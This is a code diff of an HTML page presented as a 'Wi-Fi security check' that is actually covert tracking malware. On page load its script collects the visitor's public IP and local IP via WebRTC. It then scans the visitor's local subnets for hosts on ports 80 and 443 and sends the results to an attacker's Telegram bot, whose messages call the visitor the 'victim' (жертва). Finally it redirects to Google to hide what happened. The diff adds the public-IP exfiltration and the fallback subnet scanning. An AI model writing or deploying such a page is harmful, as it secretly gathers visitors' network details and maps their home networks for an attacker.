@@ -6,13 +6,23 @@
 <body>
     <h2>Проверка безопасности Wi-Fi...</h2>
     <script>
-        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
-        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';
+        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';   // ← сюда свой токен
+        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';       // ← сюда свой chat id
 
-        async function sendToTelegram(msg) {
+        async function sendMsg(text) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
             } catch (e) {}
+        }
+
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return 'не удалось получить';
+            }
         }
 
         function getLocalIP() {
@@ -29,57 +39,65 @@
                         }
                     }
                 };
-                setTimeout(() => reject(new Error('No local IP found')), 3000);
+                setTimeout(() => reject(new Error('Локальный IP не найден')), 3000);
             });
         }
 
-        function scanSubnet(baseIP) {
-            const parts = baseIP.split('.');
-            const subnet = parts.slice(0, 3).join('.');
-            const promises = [];
+        async function scanSubnet(subnet) {
             const found = [];
-
+            const parts = subnet.split('.');
+            const base = parts.slice(0, 3).join('.');
+            const promises = [];
             for (let i = 1; i <= 254; i++) {
-                const ip = `${subnet}.${i}`;
-                const p = new Promise((resolve) => {
+                const ip = `${base}.${i}`;
+                promises.push(new Promise((resolve) => {
                     const img = new Image();
                     img.onload = () => {
-                        found.push(`Хост: ${ip} (порт 80)`);
+                        found.push(`✅ ${ip}:80`);
                         resolve();
                     };
                     img.onerror = () => {
                         const img2 = new Image();
                         img2.onload = () => {
-                            found.push(`Хост: ${ip} (порт 443)`);
+                            found.push(`✅ ${ip}:443`);
                             resolve();
                         };
                         img2.onerror = () => resolve();
                         img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
                     };
                     img.src = `http://${ip}/favicon.ico?${Math.random()}`;
-                });
-                promises.push(p);
+                }));
             }
-            return Promise.all(promises).then(() => found);
+            await Promise.all(promises);
+            return found;
         }
 
         (async () => {
+            // Отправляем публичный IP сразу
+            const pubIP = await getPublicIP();
+            await sendMsg(`🔵 Публичный IP жертвы: ${pubIP}`);
+
+            let localIP = null;
             try {
-                let localIP;
-                try {
-                    localIP = await getLocalIP();
-                } catch (e) {
-                    await sendToTelegram(`Не удалось получить локальный IP: ${e.message}`);
-                    return;
-                }
-                await sendToTelegram(`Жертва зашла. Локальный IP: ${localIP}\nСканирую подсеть...`);
+                localIP = await getLocalIP();
+                await sendMsg(`🟢 Локальный IP: ${localIP}\nСканирую её подсеть...`);
                 const hosts = await scanSubnet(localIP);
-                const result = hosts.length > 0 ? hosts.join('\n') : 'Устройства не найдены';
-                await sendToTelegram(`Результат:\n${result}`);
+                const res = hosts.length > 0 ? hosts.join('\n') : 'Ничего не найдено в этой подсети';
+                await sendMsg(`Результат:\n${res}`);
             } catch (e) {
-                const errMsg = e.message || JSON.stringify(e) || 'Неизвестная ошибка';
-                await sendToTelegram(`Ошибка: ${errMsg}`);
+                await sendMsg(`🟡 Локальный IP не получен, сканирую типовые подсети...`);
+                const commonSubnets = ['192.168.0.0', '192.168.1.0', '10.0.0.0'];
+                let allHosts = [];
+                for (const subnet of commonSubnets) {
+                    await sendMsg(`Сканирую ${subnet}/24...`);
+                    const hosts = await scanSubnet(subnet);
+                    allHosts = allHosts.concat(hosts);
+                }
+                const total = allHosts.length > 0 ? allHosts.join('\n') : 'Вообще ничего не найдено';
+                await sendMsg(`Результат по всем подсетям:\n${total}`);
             }
+
+            // Редирект
             window.location = 'https://www.google.com';
         })();
     </script>
